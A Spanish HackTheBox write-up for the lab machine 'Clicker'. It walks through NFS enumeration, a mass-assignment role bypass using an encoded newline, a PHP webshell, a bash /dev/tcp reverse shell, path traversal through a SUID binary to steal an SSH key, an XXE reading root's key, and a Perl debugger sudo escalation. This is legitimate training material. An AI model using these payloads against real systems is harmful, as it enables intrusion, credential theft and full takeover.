---
title: "Clicker"
date: 2025-05-29 16:41:27 +0200
categories: writeups HackTheBox
tags: máquina linux maattack rce xss máquina linux nfs infoleak xxe binaryanalysis codeanalysis suid sudoers perl
description: Writeup de la máquina Clicker de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Clicker** es una máquina **Linux** de dificultad **Medium** de la plataforma de **HackTheBox**. Gracias al **backup** encontrado en el servicio **NFS** somos capaces de ver el código fuente de la página web. Tras revisarlo veremos que existe una sanitización para evitar un **Mass-Assignment Attack** pero gracias al salto de línea (`\n`) **URL Encodeado** (`%0a`) seremos capaces de bypassear dicha comprobación. Abusando de este concepto conseguiremos ganar acceso como el usuario **Administrador** a través del cual tendremos acceso al panel de administración. En dicho panel de administración volveremos a abusar de este concepto (**Mass-Assignment Attack**) para escribir el contenido que queramos en el fichero exportado sobre el cual controlamos su extensión. Para ganar acceso a la máquina víctima introduciremos el contenido de una **Webshell** (`<?php system($_GET[0]); ?>`) para posterio<rmente enviarnos una **Reverse Shell**. Una vez estamos en la máquina víctima nos convertiremos en el usuario **jack** gracias a una **Arbitrary File Read** de su clave privada **id_rsa**. Por último, nos autenticaremos como el usuario **root**  gracias a un **XXE** que nos permitirá leer su clave privada.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204221220.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.232`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.232 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22, 80, 111, 2049, 32861, 44799, 45447, 53657 y 55471**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204221436.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80,9091 -sCV 10.10.11.194 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es la existencia de los puertos **2049** y **111**, además del dominio **clicker.htb**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204221618.png>)
___
### Puerto 80 - HTTP (Apache)

En primer lugar, aplicaremos **Virtual hosting** para ello debemos de incorporar la siguiente línea `10.10.11.194 clicker.htb` al `/etc/hosts`. Una vez hecho esto seremos capaces de ver la página web alojada en el puerto **80**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204221758.png>)

Tras navegar por la web veremos que mensajes de error (`?err`) y de éxito (`?msg`) a través de los valores pasados en la **URL**. En el caso de que no exista ninguna sanitización dicho comportamiento podría ser vulnerable a un **XSS**. Tal y como observamos a continuación la web es vulnerable a este tipo de ataque.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204221940.png>)

En la siguiente captura de pantalla veremos como de igual forma conseguimos inyectar código HTML debido a la inexistente sanitización. 

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204222032.png>)

En nuestro perfil de usuario aparecen datos como el nuestro **nombre de usuario**, el número de **clicks**  y el **nivel** en el que nos encontramos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204222357.png>)

En la siguiente página podemos ver el funcionamiento de un juego **clicker** (**Cookie Clicker**), los valores referentes al número de **clicks** y el **nivel** son obtenidos en está página en función del número de clicks que hagamos y en el nivel que nos encontremos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204222544.png>)

Si capturamos la petición gracias a **FoxyProxy** y **BurpSuite** seremos capaces de modificar el número de **clicks** y el **nivel**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204222506.png>)

Si volvemos a revisar nuestro perfil veremos que nuestros datos se han actualizado por lo que podemos poner el número de **clicks** y el **nivel** que nosotros queramos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204222429.png>)

___
### Puerto 2049 - NFS

Como no encontramos nada interesante pasaremos a enumerar el puerto **2049** (**NFS**). En el siguiente link [NFS - 2049](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html) encontramos información útil para enumerar de dicho puerto.

Ejecutando el siguiente comando seremos capaces de ver las monturas presentes en el puerto **2049**, es decir en el servicio **NFS**.

```bash
showmount -e 10.10.11.232
```

Observamos que existe una montura que nos está compartiendo todo el contenido que hay bajo el directorio `/mnt/backups/*`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204223133.png>)

Usando el siguiente comando seremos capaces de acceder a dicha montura y de esta forma podemos observar el contenido que hay dentro de ella.

```bash
mount -t nfs 10.10.11.232:/mnt/backups /mnt/clicker -o nolock
```

Tal y como se aprecia en la siguiente captura de pantalla veremos el archivo `clicker.htb_backup.zip`, el cual aparentemente parece ser una copia de seguridad de la página web.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204223321.png>)

Destacar que de igual forma podemos usar **Nmap** para listar el contenido dentro de la montura `/mnt/backups/*`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204223917.png>)

Tras habernos copiado dicho fichero al directorio de trabajo (`/content`) veremos que efectivamente se trata de un backup de la página web, incluyendo el código fuente. 

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204224558.png>)
#### save_game.php

En este fichero veremos como se está aplicando una sanitización para evitar que el usuario cambie su **rol** en el caso de que se realice la siguiente petición.

```php
GET /save_game.php?clicks=<num_clicks>&level=<level>&role=Admin # Esto daría error ya que no nos permite modifcar el role debido a la sanitización.
```

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204224655.png>)
#### dbutils.php

En el siguiente fichero veremos como la función `save_profile()` la cual es llamada desde **save_game.php** recibe como segundo parámetro todos los valores presentes en la variable super global `$_GET`. Dichos valores son pasados a una consulta SQL (`UPDATE`) de manera dinámica y modular. Gracias esto somos capaces de cambiar nuestra información a través de una petición modificada a `/save_game.php`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225411.png>)
#### admin.php

En este fichero veremos que comprueba si nuestro rol es **Admin**, en caso afirmativo seremos capaces de ver el panel de administración en caso contrario nos redirigirá al **index.php**

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225506.png>)
#### Bypass de comparación estricta con caracteres ocultos (`\n`)

En la siguiente prueba de concepto veremos como al introducir un salto de línea (`\n`) la cadena `role` no es igual a `role\n`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225051.png>)

___
## Explotación
### Mass Assignment Attack

Una vez hemos revisado el código fuente intentaremos acontecer un **Mass Assignment Attack** para asignarnos el **rol** `Admin`. 

Para aplicar este tipo de ataque capturaremos la petición de cuando le damos a **Save Game** (`/save_game.php`), y en los parámetros pasados por **GET** añadiremos la siguiente cadena `role=Admin` para intentar asignarnos el **rol** de **Administrador**, pero tal y como vemos en la captura nos dará un error.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225620.png>)

Aplicando el mismo concepto que hemos visto desde el php interactivo podemos bypassear dicha comprobación añadiendo un salto de línea (`\n`) **URL Encodeado**. Es decir, la cadena quedaría tal que así `role%0a=Admin`. Finalmente, veremos como no nos salta el mensaje de error por lo que la información ha sido actualizada correctamente.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225741.png>)

>[!WARNING]
>Es posible que tengamos que deslogearnos y volvernos a logear para que se actualice nuestra sesión donde se guarda el rol (`$_SESSION["role"]`).

Observaremos que ahora somos capaces de ver una nueva pestaña (**Administration**), es decir el panel de administración.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204225916.png>)

___
### Mass Assignment Attack -> RCE

Una vez accedemos al panel de administración veremos que somos capaces de exportar información en diferentes formatos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204230101.png>)

Accederemos al link donde se encuentra nuestra información exportada y veremos que nos crea un archivo en función del formato especificado.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204230045.png>)

Si capturamos la petición (**FoxyProxy** + **BurpSuite**) de cuando le damos a **Export** veremos que la extensión está viajando por **POST**. A continuación, probaremos a modificar la extensión para ver si tenemos capacidad de crear un fichero con la extensión que queramos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204230203.png>)

Veremos que no nos salta ningún error por lo que somos capaces de exportar la información con la extensión que queramos.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204230152.png>)

Volveremos a revisar el código fuente y comprobaremos que la información que se muestra en el archivo es obtenida dinámicamente.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204230533.png>)

Para asegurarnos de la anterior afirmación enviaremos la siguiente petición, donde estamos modificando los **clicks** y el **nivel**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231235.png>)

Volveremos a usar el botón de **Export** y veremos reflejados los valores establecidos previamente.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231223.png>)

A continuación, intentaremos introducir una cadena de texto en el campo `level` pero veremos que nos da un error (`500 Internal Server Error`).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231308.png>)

Si bien recordamos en el fichero **save_game.php** tan solo realiza la comprobación sobre el el parámetro `role` por lo que aparentemente somos capaces de modificar otros a atributos como el `nickname` el cual vemos reflejado en el fichero exportado.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231345.png>)

Si bien recordamos la función `save_profile()` se encarga de actualizar todos los datos que son pasados a través de la variable super global `$_GET`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231427.png>)

En el **Mass Assignment Attack** que estamos por acontecer la consulta SQL (`UPDATE`) quedaría tal que así.

```sql
UPDATE players SET clicks = 0, level = 0, nickname = test WHERE username = :player
```

Capturaremos la petición de **Save Game** (**FoxyProxy** + **BurpSuite**) y a esta le concatenaremos la siguiente cadena `nickanem=test` para acontecer el **Mass Assignment Attack**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231646.png>)

Veremos que hemos cambiado nuestro nombre de `test` a `test1` por lo que tenemos control sobre lo que escribimos en el fichero.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204231726.png>)

En el este punto, lo que haremos será poner el código necesario para obtener una **Webshell** en el parámetro `nickname`.

> Destacar la importancia de **URL Encodear** el texto con <kbd>CTRL</kbd> + <kbd>U</kbd>.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204232259.png>)

Exportaremos el fichero con la extensión **.php** para que nuestra **Webshell** sea interpretada correctamente.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204232414.png>)

Accederemos al fichero generado y al concatenarle el parámetro `0` veremos que tenemos ejecución remota de comandos [RCE](RCE).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204232442.png>)

En este punto lo que haremos será ponernos en escucha con  **NetCat** (`nc -nlvp 443`) para posteriormente enviarnos una **Reverse Shell** usando el típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.11.232/443 0>%261"`).

En la siguiente captura de pantalla podemos observar como hemos ganado acceso a la máquina víctima a través de una **Reverse Shell**

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204232533.png>)

___
## Movimiento lateral de usuario
### Enumeración local

Una vez hayamos ganado acceso a la máquina víctima realizaremos un **Tratamiento de la TTY** para poder operar desde una terminal más cómoda.

En primer lugar buscaremos por permisos **SUID**, y nos llamará la atención el **/opt/manage/execute_query** ya que no es un binario típico.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233358.png>)

Si nos dirigimos a **/opt** veremos un directorio (**/manage**) y un script (**monitor.sh**).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233230.png>)

Aunque tenemos permisos de ejecución sobre **monitor.sh** dentro del mismo se comprueba que tan solo sea ejecutado por **root**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233251.png>)

Si nos metemos en el directorio **/manage** veremos el binario sobre el que tenemos permisos **SUID** (**execute_query**), y además nos encontraremos con un **README.txt** el cual es un manual para dicho script.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193759.png>)

Gracias al comando `file` sabremos que se trata de un binario compilado de **64 bits**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233518.png>)

Tras ejecutar el binario veremos que las opciones se corresponden con el manual (**README.txt**).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233750.png>)

Además, probando y probando nos daremos cuenta que al introducir **2** argumentos intenta leer un fichero (*Esto lo trataremos más adelante*).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250204233712.png>)
### Binary Analysis - SUID

Al ejecutar el siguiente comando seremos capaces de ver instrucciones a bajo nivel que se acontecen cuando seleccionamos la **segunda** opción.

```bash
strace ./execute_query 2
```

Tal y como se aprecia, somos capaces de ver código fuente del sistema como lo es la cadena `/home/jack/queries/populate.sql`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205180424.png>)

En este punto lo que haremos será **Transferirnos** el binario a nuestra máquina de atacante y analizarlo con **ghidra**.

```c
undefined8 main(int num_args,long param_2)
/*
Primer argumento (num_args) -> Número de argumentos
Segundo argumento (param_2) -> Argumentos
*/
{
  int first_argument;
  undefined8 uVar1;
  char *filename;
  size_t sVar2;
  size_t sVar3;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 filePath;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 cmd_str;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  
  /* Se le debe pasar 2 argumentos al programa */
  if (num_args < 2) {
    puts("ERROR: not enough arguments");
    uVar1 = 1;
  }
  else {
    /* 
    param_2 -> argv[0] -> Nombre del script
    param_2 + 8 -> argv[1] -> Primer argumento
	param_2 + 16 -> argv[2] -> Segundo argumento  
	
	./execute_query num X */
    first_argument = atoi(*(char **)(param_2 + 8));
    filename = (char *)calloc(0x14,1);
    switch(first_argument) {
    case 0:
          puts("ERROR: Invalid arguments");
      uVar1 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(filename,"create.sql",20);
      break;
    case 2:
      strncpy(filename,"populate.sql",20);
      break;
    case 3:
      strncpy(filename,"reset_password.sql",20);
      break;
    case 4:
      strncpy(filename,"clean.sql",20);
      break;
    default:
      //En caso no introducir ningun número de los anteriores (1-5), el segundo argumento lo copiará en filename
      strncpy(filename,*(char **)(param_2 + 16),20);
    }
    
    /* /home/jack/queries/\0 */
    filePath = L'\x6d6f682f';
    local_90 = L'\x712f6b63';
    local_88 = L'\x002f7365';
    sVar2 = strlen((char *)&filePath);
    sVar3 = strlen(filename);
    __dest = (char *)calloc(sVar3 + sVar2 + 1,1);
    // __dest = /home/jack/queries/
    strcat(__dest,(char *)&filePath);
    /* __dest = __dest + filename (argv[2])
       _dest = /home/jack/queries/<argv[2]> */
    strcat(__dest,filename);
    setreuid(1000,1000);
    /*
	1 -> Capacidad de lecutra (R_OK)
	2 -> Capacidad de escritura (W_OK)
	3 -> Capacidad de ejecución (X_OK)
	4 -> ¿ Existe el archivo ? (F_OK)  
    */
    /*
	¿Existe el archivo __dest (/home/jack/queries/<argv[2]>) ?
		Sí -> "status_code = 0"
		No -> "status_code = 1" / otros números referentes al código de estado
	*/
    status_code = access(__dest,4);
    // Si existe el archivo
    if (status_code == 0) {
	  
	  // /usr/bin/mysql -u clicker_db_user --password='cliker_db_password' clicker -v < \0
      cmd_str = L'\x7273752f';
      local_70 = L'\x73796d2f';
      local_68 = L'\x6c632075';
      local_60 = L'\x62645f72';
      local_58 = L'\x2d2d2072';
      local_50 = L'\x64726f77';
      local_48 = L'\x656b6369';
      local_40 = L'\x7361705f';
      local_38 = L'\x63202764';
      local_30 = L'\x2d207265';
      local_28 = 0;
      sVar2 = strlen((char *)&cmd_str);
      sVar3 = strlen(filename);
      filename = (char *)calloc(sVar3 + sVar2 + 1,1);
      strcat(filename,(char *)&cmd_str);
      strcat(filename,__dest);
      system(filename);
    }
    // Si no existe el archivo
    else {
      puts("File not readable or not found");
    }
    uVar1 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar1;
  }
                      /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

>[!INFO]
>Tras un profundo análisis llegaremos a la conclusión de que a través del **segundo argumento** del script podemos leer un archivo del sistema. Destacar que se le concatena la cadena (`/home/jack/queries`), por lo que el argumento quedaría tal que así, `/home/jack/queries/<argv[2]>`.

Al igual que hemos visto antes veremos que al introducir **2** argumentos intenta leer un fichero y en caso de que no nos lo encuentre nos saltará el siguiente mensaje de error.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193410.png>)

Si intentamos leer el **/etc/passwd** veremos que tampoco nos encuentra dicho fichero aunque realmente si que existe.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193426.png>)

En cambio, si retrocedemos unos cuantos directorios hacia atrás veremos como conseguimos leer el **/etc/passwd**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193349.png>)

En este punto intentaremos leer la **id_rsa** del usuario **jack**, para ello retrocederemos un directorio.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193546.png>)

Al conectarnos por **ssh** veremos que nos da un error, y es debido a que le faltan dos guiones `-` al final de la primera y la última línea.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205193854.png>)

Finalmente, veremos como conseguimos conectarnos correctamente como el usuario **jack**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205194031.png>)

___
## Escalada de privilegios
### Enumeración local

Una vez nos hemos convertido en el usuario **jack** listaremos nuestros permisos de **Sudoers** y veremos que podemos ejecutar el script **/opt/monitor.sh** como **root**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205194042.png>)

Mirando el código del script (**/opt/monitor.sh**) veremos que realiza una petición a `http://clicker.htb/diagnostic.php`.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205194317.png>)

Al ejecutar el script veremos que nos devuelve una estructura **XML**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205195321.png>)
### XXE

El primer ataque que se nos viene a la cabeza cuando tratamos con **XML** es un **XXE** por lo que intentaremos acontecerlo.

En primer lugar, deberemos de averiguar como interceptar una petición desde la terminal, y tras investigar daremos con el siguiente foro de [StackOverFlow - http_proxy](https://stackoverflow.com/questions/9445489/performing-http-requests-with-curl-using-proxy).

Finalmente, debemos de ejecutar el siguiente comando para interceptar la petición en nuestro **BurpSuite**.

```bash
sudo http_proxy="http://10.10.14.14:8080" /opt/monitor.sh
```

>[!WARNING]
>Para poder interceptar la petición debemos de establecer que el **Proxy** de **BurpSuite** escuche en todas las interfaces.

Tras haberlo configurado todo, veremos que recibimos correctamente la petición.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205200545.png>)

En este punto intentaremos ver la respuesta a dicha petición desde **BurpSuite**, para ello le daremos a <kbd>Click Derecho</kbd> y seleccionaremos **Do intercept** → **Response to this request**. Tal y como vemos a continuación, conseguiremos ver la respuesta antes de que llegue a su destino por lo que la modificaremos y le daremos a **Forward**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205200721.png>)

Una vez le hayamos dado al botón de **Forward** veremos que hemos sido capaces de modificar el contenido de la petición gracias a **BurpSuite**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205200613.png>)

Realizaremos el mismo procedimiento de antes, pero ahora en la respuesta modificada intentaremos cargar una entidad.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201056.png>)

Tal y como se aprecia a continuación, no nos interpretará la entidad.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205200912.png>)

En este punto intentaremos leer un archivo del sistema (**/etc/passwd**), para ello modificaremos la respuesta con el siguiente contenido.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201122.png>)

Tal y como vemos a continuación, no somos capaces de conseguimos leer el **/etc/passwd**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201130.png>)

Otra forma de leer un fichero es sin usar ningún **wrapper** es decir, indicando directamente el archivo (**/etc/passwd**)

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201217.png>)

Como se puede observar, leeremos el contenido del **/etc/passwd**, lo que demuestra que tenemos capacidad de leer cualquier fichero del sistema. Esto se debe a queel script está siendo ejecutado por el usuario **root**, gracias a los permisos otorgados en **Sudoers**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201242.png>)

Finalmente, intentaremos leer la clave privada **id_rsa** del **root**. Para ello, introduciremos el siguiente contenido en la respuesta de la petición.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201333.png>)

A continuación, leeremos el contenido de la **id_rsa** lo que nos permitirá autenticarnos en el usuario **root**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201348.png>)

Gracias al siguiente comando, nos conectaremos a la máquina víctima como el usuario **root**, utilizando su clave privada.

```bash
ssh -i id_rsa.root root@10.10.11.232
```

Observaremos que hemos logrado acceder a la máquina víctima como el usuario **root**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205201434.png>)
### Perl \[EXTRA]

>[!INFO]
>A continuación, se muestra otra alternativa para elevar nuestros privilegios. 

Tal y como vemos a continuación, al introducir las variables `PERL5OPT` y `PERL5DB` entraremos en el modo debugging en el que podremos ejecutar comandos como **root**.

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205202043.png>)

Una vez que hemos conseguido ejecutar comandos como **root** asignaremos permisos **SUID** a la **bash** (`chmod +s /bin/bash`) para convertirnos en **root** con una **bash privilegada** (`bash -p`).

![](<../assets/images/posts/2025-05-29-clicker/Pasted image 20250205202215.png>)

